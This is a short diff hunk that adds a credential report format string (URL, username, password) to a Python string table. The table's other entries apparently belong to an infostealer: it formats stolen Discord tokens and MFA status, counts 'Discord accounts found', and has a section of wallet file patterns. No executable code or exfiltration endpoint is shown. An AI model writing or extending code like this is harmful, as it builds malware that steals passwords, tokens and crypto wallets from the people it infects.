@@ -506,6 +506,7 @@ STRINGS = [
     ("discord_report_fmt", "Username: {}\nID: {}\nToken: {}\nBadges: {}\nMFA: {}\n{}\n"),
     ("discord_accounts_found", " Discord accounts found\n"),
     ("sender_embeds_status", "embeds["),
+    ("cred_fmt", "URL: {}\nUsername: {}\nPassword: {}\n{}\n"),
 
     # === wallet file patterns ===
     ("wpat_log", ".log"),
